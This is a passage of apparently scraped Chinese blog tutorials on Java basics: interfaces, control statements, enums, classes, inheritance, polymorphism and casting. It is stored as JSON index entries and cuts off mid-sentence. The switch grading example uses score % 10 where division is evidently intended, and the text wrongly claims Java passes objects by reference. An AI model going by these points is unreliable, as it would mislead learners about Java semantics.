} // 实现接口 class Sparrow implements Bird { @Override public void fly() { } @Override public void eatBug() { } @Override public void breedingOffspring() { } } 三、标记接口 标记接口有时也叫标签接口（Tag interface），即接口不包含任何方法。\n在Java里很容易找到标记接口的例子，比如 JDK 里的 Serializable 接口就是一个标记接口。\n标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。\n标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。\n1 2 3 public interface Flyable { } 四、接口与类的比较 接口不能用于实例化对象，对象可以； 接口没有构造方法，类有构造方法 接口中所有的方法必须是抽象方法，类中所有方法都不能是抽象方法； 接口不能包含成员变量，除了 static 和 final 变量，类中可以有成员变量； 接口不是被类继承了，而是要被类实现； 接口支持多继承，类只支持单继承。 五、接口默认方法冲突 如果先在一个接口中将一个方法定义为默认方法，然后又在超类或另一个接口中定义了同样的方法，就会产生一个二义性错误。\n对于解决这个问题，Java 如下规则.\n**超类优先：**如果超类提供了一个具体方法，同名并且有相同参数的默认方法会被忽略； **接口冲突：**如果一个接口提供了一个默认方法，另一个接口提供了一个同名而且参数类型相同的方法。则实现类必须覆盖这个方法来解决冲突。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%8E%A5%E5%8F%A3/","title":"Java学习之路——接口"},{"content":"Java学习之路——控制语句 一、条件语句 1. if \u0026hellip; else \u0026hellip; 语法\n1 2 3 4 if(布尔表达式) { //如果布尔表达式为true将执行的语句 } 例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import java.util.Scanner; public class Demo { public static void main(String[] args) { Scanner input = new Scanner(System.in); System.out.print(\u0026#34;请输入一个整数：\u0026#34;); int num = input.nextInt(); if (num \u0026gt;= 0) { System.out.println(\u0026#34;输入了一个非负数\u0026#34;); } else { System.out.println(\u0026#34;输入了一个负数\u0026#34;); } } } 2. if \u0026hellip; else if \u0026hellip; else \u0026hellip; 语法\n1 2 3 4 5 6 7 if(布尔表达式 1){ //如果布尔表达式 1的值为true执行代码 } else if(布尔表达式 2){ //如果布尔表达式 2的值为true执行代码 } else { //如果以上布尔表达式都不为true执行代码 } 例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.util.Scanner; public class Demo { public static void main(String[] args) { Scanner input = new Scanner(System.in); System.out.print(\u0026#34;请输入一个整数：\u0026#34;); int num = input.nextInt(); if (num \u0026gt; 0) { System.out.println(\u0026#34;输入了一个非负数\u0026#34;); } else if (num \u0026lt; 0) { System.out.println(\u0026#34;输入了一个负数\u0026#34;); } else { System.out.println(\u0026#34;输入了一个 0\u0026#34;); } } } 二、循环语句 1. for 循环 语法\n1 2 3 for(初始化; 布尔表达式; 更新) { //代码语句 } 执行过程\n最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句； 然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句； 执行一次循环后，更新循环控制变量； 再次检测布尔表达式，循环执行上面的过程。 例子\n1 2 3 4 5 6 7 public class Demo { public static void main(String[] args) { for (int i=0 ; i\u0026lt;10 ; i++) { System.out.println(i); } } } 2. 增强 for 循环 语法\n1 2 3 4 for(声明语句 : 表达式) { //代码句子 } **声明语句：**声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。\n**表达式：**表达式是要访问的数组名，或者是返回值为数组的方法。\n例子\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { int[] nums = {0, 1, 2, 3}; for (int i:nums) { System.out.println(i); } } } 3. while 循环 语法\n1 2 3 while( 布尔表达式 ) { //循环内容 } **执行过程：**只要布尔表达式为 true，循环就会一直执行下去。\n例子\n1 2 3 4 5 6 7 8 9 10 public class Demo { public static void main(String[] args) { int i = 0; while (i \u0026lt; 10) { System.out.println(i); i++; } } } 4. do … while 循环 语法\n1 2 3 do { //代码语句 } while (布尔表达式); **执行过程：**布尔表达式在循环体的后面，所以语句块在检测布尔表达式之前已经执行了。 如果布尔表达式的值为 true，则语句块一直执行，直到布尔表达式的值为 false。\n例子\n1 2 3 4 5 6 7 8 9 10 public class Demo { public static void main(String[] args) { int i = 0; do { System.out.println(i); i++; } while (i \u0026lt; 10); } } 5. break 与 continue 用途\nbreak： 主要用在循环语句或者 switch 语句中，用来跳出整个语句块。break 仅仅跳出最里层的循环，外层循环会继续执行。 continue： 适用于任何循环控制结构中。作用是让程序立刻跳转到下一次循环的迭代。在 for 循环中，continue 语句使程序立即跳转到更新语句。在 while 或者 do…while 循环中，程序立即跳转到布尔表达式的判断语句。 例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class Demo { public static void main(String[] args) { for (int i = 0 ; i\u0026lt;10 ; i++) { if (i % 2 == 0) { continue; } System.out.println(i); if (i == 9) { break; } } } } 6. 带标签的 break 与 continue break 语句和 continue 语句默认情况下会对最近的一个循环产生作用，如果我们要对指定的循环产生作用，可以通过加标签的方式实现效果。\n1 2 3 4 5 6 7 8 9 10 11 12 public class Demo { public static void main(String[] args) { label:for (int i=0 ; i\u0026lt;10 ; i++) { for (int j=0; j\u0026lt;10 ; j++) { if (j % 2 == 1) { System.out.println(j); continue label; } } } } } 加了标签之后，break 语句和 continue 语句就能结束指定的循环语句了。\n三、分支选择语句 switch case 语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。\n语法\n1 2 3 4 5 6 7 8 9 10 11 switch(expression){ case value : //语句 break; //可选 case value : //语句 break; //可选 //你可以有任意数量的case语句 default : //可选 //语句 } switch case 语句有如下规则：\nswitch 语句中的变量类型可以是： byte、short、int 或者 char。从 Java SE 7 开始，switch 支持字符串 String 类型了，同时 case 标签必须为字符串常量或字面量。 switch 语句可以拥有多个 case 语句。每个 case 后面跟一个要比较的值和冒号。 case 语句中的值的数据类型必须与变量的数据类型相同，而且只能是常量或者字面常量。 当变量的值与 case 语句的值相等时，那么 case 语句之后的语句开始执行，直到 break 语句出现才会跳出 switch 语句。 当遇到 break 语句时，switch 语句终止。程序跳转到 switch 语句后面的语句执行。case 语句不必须要包含 break 语句。如果没有 break 语句出现，程序会继续执行下一条 case 语句，直到出现 break 语句。 switch 语句可以包含一个 default 分支，该分支一般是 switch 语句的最后一个分支（可以在任何位置，但建议在最后一个）。default 在没有 case 语句的值和变量值相等的时候执行。default 分支不需要 break 语句。 switch case 执行时，一定会先进行匹配，匹配成功返回当前 case 的值，再根据是否有 break，判断是否继续输出，或是跳出判断。 如果 case 语句块中没有 break 语句时，JVM 并不会顺序输出每一个 case 对应的返回值，而是继续匹配，匹配不成功则返回默认 case。 如果当前匹配成功的 case 语句块没有 break 语句，则从当前 case 开始，后续所有 case 的值都会输出，如果后续的 case 语句块有 break 语句则会跳出判断 例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import java.util.Scanner; public class Demo { public static void main(String[] args) { Scanner input = new Scanner(System.in); System.out.print(\u0026#34;请输入你的成绩：\u0026#34;); int score = input.nextInt(); switch (score % 10) { case 9: System.out.println(\u0026#34;优异\u0026#34;); break; case 8: System.out.println(\u0026#34;良好\u0026#34;); break; case 7: System.out.println(\u0026#34;一般\u0026#34;); break; case 6: System.out.println(\u0026#34;及格\u0026#34;); break; default: System.out.println(\u0026#34;不及格\u0026#34;); } } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/","title":"Java学习之路——控制语句"},{"content":"Java学习之路——枚举类 概述 在数学和计算机科学理论中，一个集的枚举是列出某些有穷序列集的所有成员的程序，或者是一种特定类型对象的计数。这两种类型经常重叠。\t——维基百科\n枚举类型是 Java 5 中新增特性的一部分，它是一种特殊的数据类型。\n其特殊之处在于它既是一种类（class）类型但是又比普通的类类型多了些特殊的约束，但是这些约束的存在也造就了枚举类型的简洁性、安全性以及便捷性。\n枚举类有着以下特点：\n定义的enum类型总是继承自java.lang.Enum，且无法被继承； 只能定义出enum的实例，而无法通过new操作符创建enum的实例； 定义的每个实例都是引用类型的唯一实例； 可以将enum类型用于switch语句。 一、创建枚举类 在 Java 程序中，枚举类使用 enum 关键字来定义，定义的各个常量之间使用逗号 , 来分割。\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { System.out.println(Weekday.SUN); } } enum Weekday { SUN, MON, TUE, WED, THU, FRI, SAT; } 二、常用操作 1. name()方法 返回常量名的字符串形式。\n1 System.out.println(Weekday.SUN.name()); // SUN 2. ordinal()方法 返回常量的索引值。\n在枚举类中，每个常量都像数组一样有着一个索引值，索引值和常量的位置有关。改变常量的的顺序其索引值也会变化。\n1 System.out.println(Weekday.SUN.ordinal()); // 0 3. valueOf()方法 返回指定字符串值的枚举常量。\n1 System.out.println(Weekday.valueOf(\u0026#34;SUN\u0026#34;)); // SUN 4. 遍历 我们可以实验 for 语句来遍历枚举类中的常量。\n1 2 3 for (Weekday var : Weekday.values()) { System.out.print(var + \u0026#34; \u0026#34;); } // SUN MON TUE WED THU FRI SAT 5. switch 语句中的使用 1 2 3 4 5 6 7 8 9 10 11 12 13 Scanner scan = new Scanner(System.in); Weekday day = Weekday.valueOf(scan.nextLine()); switch (day) { case SUN: System.out.println(\u0026#34;SUN\u0026#34;); break; case MON: System.out.println(\u0026#34;MON\u0026#34;); break; default: System.out.println(\u0026#34;Others\u0026#34;); } 三、进阶使用 枚举类中的常量是什么类型的呢？\n在枚举类中的每一个常量事实上就是枚举类的实例。\n1 System.out.println(Weekday.SUN.getClass()); // class Weekday 既然每一个常量都是枚举类的实例，那么我们在枚举类中定义的方法和属性也应将会作用于每一个实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class Demo { public static void main(String[] args) { System.out.println(Weekday.SUN.getChinese()); // 星期天 } } enum Weekday { SUN(\u0026#34;星期天\u0026#34;, 7), MON(\u0026#34;星期一\u0026#34;, 1), TUE(\u0026#34;星期二\u0026#34;, 2), WED(\u0026#34;星期bai三\u0026#34;, 3), THU(\u0026#34;星期四\u0026#34;, 4), FRI(\u0026#34;星期五\u0026#34;, 5), SAT(\u0026#34;星期六\u0026#34;, 6); private String chinese; private int day; Weekday(String name , int day) { this.chinese = name; this.day = day; } public String getChinese() { return chinese; } } 事实证明果然是可行的，那么我们就可以通过在枚举类中添加属性和方法的方式对我们常量的使用方式进行扩充了！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%9E%9A%E4%B8%BE%E7%B1%BB/","title":"Java学习之路——枚举类"},{"content":"Java学习之路——面向对象入门 一、面向对象的思想 面向对象 ：（Object Oriented，简称OOP）是一种程序设计思想，OOP思想把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。\n面向过程 (Procedure Oriented) 是一种 以过程为中心 的编程思想。这些都是以什么正在发生为主要目标进行编程，不同于面向对象的是谁在受影响。与面向对象明显的不同就是 封装、继承、类。\nJava语言就是一门典型的面向对象的编程语言。\n二、面向对象基础知识 1. 类和对象 类：类是对一类事物的描述，是抽象的、概念上的定义。它是一个定义包括在特定类型的对象中的方法和变量的软件模板，用于创建对象的蓝图。 对象：对象是对客观事物的抽象，是实际存在的该类事物的每个个体，是对类的实例化。 2. 类的基本结构 一个类包含了两个要素：特性和行为 =\u0026gt; 同一类事物具有相同的特征和行为。\n属性（property）：类或者对象具有的特征在程序中称为属性； 方法（Method）：类或者对象的行为称为方法。 3. 三大特征 封装：即把客观事物封装成抽象的类， 并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。一个类就是一个封装了数据以及操作这些数据的代码的逻辑实体。在一个对象内部，某些代码或某些数据可以是私有的，不能被外界访问。通过这种方式，对象对内部数据提供了不同级别的保护，以防止程序中无关的部分意外的改变或错误的使用了对象的私有部分。 继承：指可以让某个类型的对象获得另一个类型的对象的属性和方法。它支持按级分类的概念。继承是指这样一种能力：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。通过继承创建的新类称为“子类”或“派生类”，被继承的类称为“基类”、“父类”或“超类”。继承的过程，就是从一般到特殊的过程。要实现继承，可以通过**“继承”（Inheritance）和组合（Composition）**来实现。继承概念的实现方式有二类：实现继承与接口继承。实现继承是指直接使用基类的属性和方法而无需额外编码的能力；接口继承是指仅使用属性和方法的名称、但是子类必须提供实现的能力。 多态：是指一个类实例的相同方法在不同情形有不同表现形式。多态机制使具有不同内部结构的对象可以共享相同的外部接口。这意味着，虽然针对不同对象的具体操作不同，但通过一个公共的类，它们（那些操作）可以通过相同的方式予以调用（比如输入的形参可以不同等，去实现同一个方法从而得到不同的表现形式）。 4. 六大准则 单一职责原则 (SRP)：对一个类而言，应该仅有一个引起它变化的原因。解释：一个类中是一组相关性和高的函数，一个类尽量只实现一个功能。 开闭原则 (OCP)：软件实体应该是可以扩展的，但是不可修改。解释：当一个类实现了一个功能的时候，如果想要改变这个功能不是去修改代码，而是通过扩展的方式去实现。实现该类提供的接口方法，然后注入到该类中，通过这种方法去实现功能的改变。 里氏替换原则 (LSP)：子类型必须能够替换掉它们的基类型。解释：只要父类能出现的地方子类就可以出现，替换为子类也不会产生任何的错误。开闭原则一般可以通过里氏替换实现对扩展开放，对修改关闭的效果。 依赖倒置原则 (DIP)：抽象不应依赖于细节，细节应该依赖于抽象。解释：模块间的依赖通过抽象发生，实现类之间不发生直接的依赖关系，其依赖关系是通过接口或抽象类产生的。即依赖抽象，而不依赖具体的实现。 接口隔离原则 (ISP)：多个专用接口优于一个单一的通用接口。解释：客户端不应该依赖它不需要的接口，其目的是解开系统的耦合，从而容易重构更改。 迪米特原则 (LOD)：一个对象应该对其他对象保持最少的了解。解释：一个类应该对自己需要耦合或调用的类知道的越少越好，类的内部如何实现与调用者或依赖者没关系。 三、面向对象实现 1. 创建一个类 1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { Person p = new Person(); } } class Person { } 实际上在我们写出并运行第一个 Java 程序时，我们就已经创建了一个类，这个类是公开的，是 Java 程序运行的入口，例如上面的 Demo 类。\n在上面的程序中，我们又实现了一个 Person 类，并且实例化了一个 p 对象。\n实例化对象时通过以下方式进行创建：\n1 类名称 对象名 = new 类名称(); 2. 权限修饰符 Java有四种访问权限，其中三种有访问权限修饰符，分别为private、public、protected和default（缺省）：\nprivate: Java语言中对访问权限限制的最窄的修饰符，一般称之为“私有的”。被其修饰的类、属性以及方法只能被该类的对象访问，其子类不能访问，更不能允许跨包访问； **default：**即不加任何访问修饰符，通常称为“默认访问模式“。该模式下，只允许在同一个包中进行访问； protect: 介于 public 和 private 之间的一种访问修饰符，一般称之为“保护形”。被其修饰的类、属性以及方法只能被类本身的方法及子类访问，即使子类在不同的包中也可以访问； public： Java语言中访问限制最宽的修饰符，一般称之为“公共的”。被其修饰的类、属性以及方法不仅可以跨类访问，而且允许跨包（package）访问。 权限修饰符 同一个类 同一个包 不同包的子类 不同包的非子类 Private √ Default √ √ Protected √ √ √ Public √ √ √ √ 3. 定义方法与属性 属性：权限修饰符 + 变量类型 + 变量名 + 赋值（可选） 方法：权限修饰符 + 返回值类型 + 函数名 + ( + 形参列表 + ) + { } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class Demo { public static void main(String[] args) { Person p = new Person(); // 对 Person 类实例化 p.name = \u0026#34;小明\u0026#34;; p.talkName(); // p.age = 18; // 由于 age 是 private类型，因此外部没法访问 p.talkAge(); } } class Person { private int age; // 定义了一个age属性 public String name; public void talkAge() { // 定义了一个方法 System.out.println(\u0026#34;My age is \u0026#34; + age); } void talkName() { System.out.println(\u0026#34;My name is \u0026#34; + name); } } 4. 方法的使用 Ⅰ、基本规则 return 关键字作用于整个方法体中，其作用为结束方法的调用并返回值。返回值类型必须和声明中的一致，如果声明中返回值类型为 void，则方法中可以不使用 return 关键字； 在方法中可以调用自身； 方法中不可以定义另外一个方法。 Ⅱ、方法的重载 方法重载是一个类中定义了多个方法名相同，而他们的参数的数量不同或数量相同而类型和次序不同，则称为方法的重载(Overloading)。\n在 Java 语言中，同一个类中允许存在一个或者多个名字相同的方法，只要它们的参数列表不同（形参个数、形参类型、形参顺序）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class Demo { public static void main(String[] args) { Person p = new Person(); p.talkName(); p.talkName(\u0026#34;小张\u0026#34;); } } class Person { public void talkName() { System.out.println(\u0026#34;My name is 小明\u0026#34;); } public void talkName(String name) { System.out.println(\u0026#34;My name is \u0026#34; + name); } } Ⅲ、可变参数形参 在 Java 5 中提供了变长参数，允许在调用方法时传入不定长度的参数。变长参数是 Java 的一个语法糖，本质上还是基于数组的实现。\n在定义方法时，在最后一个形参后加上三点 …，就表示该形参可以接受多个参数值，多个参数值被当成数组传入。上述定义有几个要点需要注意：\n可变参数只能作为函数的最后一个参数，但其前面可以有也可以没有任何其他参数 由于可变参数必须是最后一个参数，所以一个函数最多只能有一个可变参数 Java的可变参数，会被编译器转型为一个数组 变长参数在编译为字节码后，在方法签名中就是以数组形态出现的。这两个方法的签名是一致的，不能作为方法的重载。如果同时出现，是不能编译通过的。可变参数可以兼容数组，反之则不成立 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Demo { public static void main(String[] args) { Person p = new Person(); p.talkName(\u0026#34;小明\u0026#34;, \u0026#34;小红\u0026#34;, \u0026#34;小刚\u0026#34;); } } class Person { public void talkName(String ... name) { for (int i=0 ; i\u0026lt;name.length ; i++) { System.out.println(\u0026#34;My name is \u0026#34; + name[i]); } } } Ⅳ、方法中参数传递 在 Java程序中，向方法传递参数时有两种传递方式：\n值传递：方法调用时，实际参数把它的值传递给对应的形式参数，方法执行中形式参数值的改变不影响实际参数的值。八种基本数据类型使用此种传递方式。 引用传递：也称为地址传递。方法调用时，实际参数的引用(地址，而不是参数的值)被传递给方法中相对应的形式参数，在方法执行中，对形式参数的操作实际上就是对实际参数的操作，方法执行中形式参数值的改变将会影响实际参数的值。引用数据类型使用此种传递方式。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Demo { public void changeValue(int arg) { arg = 100; } public void changeValue(int[] args) { args[0] = 100; } public static void main(String[] args) { int i=10; int[] arr = new int[]{10, 20, 30}; // 基本数据类型 System.out.println(i); new Demo().changeValue(i); System.out.println(i); // 引用数据类型 System.out.println(arr[0]); new Demo().changeValue(arr); System.out.println(arr[0]); } } Ⅴ、递归调用 递归是指在函数的定义中使用函数自身的方法。\n下面这个例子就是使用递归思想求取斐波那契数列：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Demo { // 输出斐波那契数列第n项对应的数字 public int fibonacciSequence(int count) { if (count == 1 || count == 2) { return 1; } else { return fibonacciSequence(count - 1) + fibonacciSequence(count - 2); } } public static void main(String[] args) { int res = new Demo().fibonacciSequence(6); System.out.println(res); } } 5. 匿名对象 经过前面的学习，我们知道创建对象时每次 new 都相当于开辟了一个新的对象，并开辟了一个新的物理内存空间。如果一个对象只需要使用唯一的一次，就可以使用匿名对象，匿名对象还可以作为实际参数传递。\n匿名对象就是没有明确的给出名字的对象，是对象的一种简写形式。一般匿名对象只使用一次，而且匿名对象只在堆内存中开辟空间，而不存在栈内存的引用。\n1 2 3 4 5 6 7 8 9 10 11 public class Demo { public static void main(String[] args) { new Person().talkName(); } } class Person { void talkName() { System.out.println(\u0026#34;My name is 小明\u0026#34;); } } 6. 构造器 构造函数（构造器）是一种特殊的函数。其主要功能是用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。构造函数与类名相同，可重载多个不同的构造函数。\n构造函数格式 1 2 3 修饰符 class_name(类名) (参数列表){ 逻辑代码 } 构造器特性 如果我们的类当中没有定义任何构造器，系统会给我们默认提供一个无参的构造器。 如果我们的类当中定义了构造器，那么系统就不会再给我们提供默认的无参构造器，如果需要无参构造器则必须显式的写出来。 作用：构建创造一个对象。同时可以给我们的属性做一个初始化操作。\n构造器与普通方法的区别 主题 构造器 方法 功能 建立一个类的实例 java功能语句 修饰 不能用bstract, final, native, static, or synchronized 能 返回类型 没有返回值，没有void 有返回值，或者void 命名 和类名相同；通常为名词，大写开头 通常代表一个动词的意思，小写开头 this 指向同一个类中另外一个构造器，在第一行 指向当前类的一个实例，不能用于静态方法 super 调用父类的构造器，在第一行 调用父类中一个重载的方法 继承 构造器不能被继承 方法可以被继承 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Demo { public static void main(String[] args) { Person p = new Person(15); p.getAge(); } } class Person { private int age; public Person(int age) { this.age = age; } public void getAge() { System.out.println(\u0026#34;My age is \u0026#34; + age); } } 7.this 关键字 在 Java中，this关键字是一个引用当前对象的引用变量，它有多种用法：\nthis关键字可用来引用当前类的实例变量； this关键字可用于调用当前类方法(隐式)； this()可以用来调用当前类的构造函数； this关键字可作为调用方法中的参数传递； this关键字可作为参数在构造函数调用中传递； this关键字可用于从方法返回当前类的实例。 通常情况下我们都选择省略 this 关键字。但是当方法的形参名和类的属性名相同时，必须通过 this 关键字来区分形参和属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class Demo { public static void main(String[] args) { Person p = new Person(\u0026#34;小明\u0026#34;, 15); } } class Person { private int age; private String name; public Person() { } public Person(String name) { this(); this.name = name; } public Person(String name, int age) { this(name); this.age = age; } } 8.JavaBean JavaBean 是特殊的 Java 类，使用 Java 语言书写，并且遵守 JavaBean API 规范。它相比于其它 Java 类有着以下特征：\n提供一个默认的无参构造函数； 类是公共的； 需要被序列化并且实现了 Serializable 接口； 可能有一系列可读写属性； 可能有一系列的 getter 或 setter 方法。 JavaBean 程序示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package com.demo; public class StudentsBean implements java.io.Serializable { private String firstName = null; private String lastName = null; private int age = 0; public StudentsBean() { } public String getFirstName(){ return firstName; } public String getLastName(){ return lastName; } public int getAge(){ return age; } public void setFirstName(String firstName){ this.firstName = firstName; } public void setLastName(String lastName){ this.lastName = lastName; } public void setAge(int age) { this.age = age; } } 9. 封装 封装：是指隐藏对象的属性和实现细节，仅对外提供公共访问方式。\n封装有着众多好处，它能将变化隔离、便于使用、提高重用性、提高安全性，是面向对象编程的重要部分。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class Demo { public static void main(String[] args) { Person p = new Person(); p.setAge(10); p.getAge(); p.setAge(-5); } } class Person { private int age; // 对输入数据进行判决 public void setAge(int age) { if (age \u0026gt; 100 || age \u0026lt; 0) { System.out.println(\u0026#34;年龄超出范围\u0026#34;); } else { this.age = age; } } public void getAge() { System.out.println(\u0026#34;My age is \u0026#34; + age); } } 10.继承 继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为。\n继承是所有OOP语言不可缺少的部分，在 Java 中使用 extends 关键字来表示继承关系。当创建一个类时，总是在继承，如果没有明确指出要继承的类，就总是隐式地从根类Object进行继承。\n继承的规则 能够继承父类的 public 和 protected 成员变量和成员方法；不能够继承父类的 private 成员变量和成员方法； 对于父类的包访问权限成员变量和成员方法，如果子类和父类在同一个包下，则子类能够继承；否则，子类不能够继承； 对于子类可以继承的父类成员变量，如果在子类中出现了同名称的成员变量，则会发生隐藏现象，即子类的成员变量会屏蔽掉父类的同名成员变量。如果要在子类中访问父类中同名成员变量，需要使用super关键字来进行引用； 对于子类可以继承的父类成员方法，如果在子类中出现了同名称的成员方法，则称为覆盖，即子类的成员方法会覆盖掉父类的同名成员方法。如果要在子类中访问父类中同名成员方法，需要使用super关键字来进行引用（隐藏是针对成员变量和静态方法的，而覆盖是针对普通方法的）； 子类是不能够继承父类的构造器，但是要注意的是，如果父类的构造器都是带有参数的，则必须在子类的构造器中显示地通过 super 关键字调用父类的构造器并配以适当的参数列表。如果父类有无参构造器，则在子类的构造器中用 super 关键字调用父类构造器不是必须的，如果没有使用 super 关键字，系统会自动调用父类的无参构造器。 继承的格式 1 2 3 4 5 class 父类 { } class 子类 extends 父类 { } 重写的规则： 子类重写的方法的方法名和形参列表与父类被重写的方法名和形参列表相同； 子类重写的方法的权限修饰符不小于父类被重写的方法权限修饰符（子类不能重写 private 权限的方法）； 重写的方法的返回值可以为被重写的方法的返回值的子类；若被重写方法返回值为基本类型，则重写方法返回值也必须为基本类型。 例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Person { private int age; private String name; public Person(int age, String name) { this.age = age; this.name = name; } public void talk() { System.out.println(\u0026#34;My name is \u0026#34; + name + \u0026#34;, my age is \u0026#34; + age); } } class Students extends Person { private String major; public Students(int age , String name, String major) { super(age , name); this.major = major; } // 子类重写父类方法时，添加 @Override 标识该方法是重写的方法（无实际意义） @Override public void talk() { super.talk(); System.out.println(\u0026#34;My major is \u0026#34; + major); } } 11. 多态 多态的定义 多态是同一个行为具有多个不同表现形式或形态的能力，就是同一个接口，使用不同的实例而执行不同操作。\n多态的优点 消除类型之间的耦合关系 可替换性 可扩充性 接口性 灵活性 简化性 多态存在的三个必要条件 继承 重写 父类引用指向子类对象：Parent p = new Child(); 多态的使用 当调用父类同名同参的方法时，实际上调用的是子类重写的方法，即虚拟方法调用。\n有了多态，程序在编译期间运行的是父类的方法，但是在运行期间运行的是子类的方法。\n注意：多态性不适用于属性（编译和运行时期都是调用的父类的属性）！\n多态的实现方式 重写 接口 抽象类和抽象方法 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class Demo { public static void main(String[] args) { Person p = new Students(); p.talk(); // p.run(); // 调用子类特有的方法（父类没有）时会报错 } } class Person { public void talk() { System.out.println(\u0026#34;I\u0026#39;m a person.\u0026#34;); } } class Students extends Person { @Override public void talk() { System.out.println(\u0026#34;I\u0026#39;m a students.\u0026#34;); } public void run() { System.out.println(\u0026#34;I\u0026#39;m running.\u0026#34;); } } 12. 转型 在 Java 中有着两种转型，分别为向上转型和向下转型，下面用一个简单的例子来演示两种转型：\n注：Son 类为 Father 类的子类\n1 2 Father f1 = new Son(); // 向上转型 Son s1 = (Son)f1;\t// 向下转型 向上转型 向上转型是多态的应用之一，它的优点可以通过下面这个例子体现出来：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class Demo { public static void main(String[] args) { Demo.doTalk(new Person()); Demo.doTalk(new Students()); Demo.doTalk(new Teacher()); } public static void doTalk(Person p) { p.talk(); } } class Person { public void talk() { System.out.println(\u0026#34;I\u0026#39;m a person.\u0026#34;); } } class Students extends Person { @Override public void talk() { System.out.println(\u0026#34;I\u0026#39;m a student.\u0026#34;); } } class Teacher extends Person { @Override public void talk() { System.out.println(\u0026#34;I\u0026#39;m a teacher.\u0026#34;); } } 在上面的代码中，如果不用向上转型则必须写三个 doTalk 方法，一个传递 Person 类对象，一个传递 Students 类对象，再来一个传递 Teacher 类对象。如果没有向上转型，则每个子类都要写相对应的方法，造成重复。可以看出向上转型很好的体现了类的多态性，增强了程序的间接性以及提高了代码的可扩展性。当需要用到子类特有的方法时可以向上转型，这也就是为什么要向下转型。\n向下转型 我们知道，在向上转型之后，引用对象是没法调用子类特有的方法的。那么如何才能调用子类特有的方法呢？这就需要用到向下转型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class Demo { public static void main(String[] args) { Person p = new Students(); p.talk(); // p.run(); Students st = (Students) p; st.run(); } } class Person { public void talk() { System.out.println(\u0026#34;I\u0026#39;m a person.\u0026#34;); } } class Students extends Person { @Override public void talk() { System.out.println(\u0026#34;I\u0026#39;m a student.\u0026#34;); } public void run() { System.out.println(\u0026#34;The students are running.\u0026#34;); } } instanceof 关键字 试一下下面的代码，看看会发生什么问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Demo { public static void main(String[] args) { Person p = new Man(); Woman wm = (Woman) p; } } class Person { } class Man extends Person { } class Woman extends Person { } 运行后发现抛出了 ClassCastException 错误。\n这是因为虽然 p 是 Person 类的引用对象，但是实例却是 Man 类的，而 Man 类和 Woman 类是没有继承关系的，因此在向下转型时就会发生错误。\n因此我们在使用向下转型之前必须要判断实例对象是否是我们需要转型的类的子类，instanceof 关键字的作用便是如此。\n用法\n1 实例对象 instanceof 类 如果实例对象是这个类的实例，则返回 True；反之返回 Fasle。\n加了判断之后就不会再发生 ClassCastException 错误了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class Demo { public static void main(String[] args) { Person p = new Man(); if (p instanceof Woman) { Woman wm = (Woman) p; } } } class Person { } class Man extends Person { } class Woman extends Person { } 小结 把子类对象直接赋给父类引用是向上转型，向上转型自动转换； 向上转型时会优先使用子类中重写父类的方法； 向上转型不能使用子类特有的属性和方法，只能引用父类的属性和方法，但是子类重写父类的方法是有效的； 向上转型可以将父类作为参数，其作用是减少重复代码，使代码变得简洁，也更好的体现了多态； 指向子类对象的父类引用赋给子类引用是向下转型，要强制转换。使用向下转型，必须先向上转型； 向下转型可以让父类引用使用子类的新增方法。 向下转型时，为了安全可以用 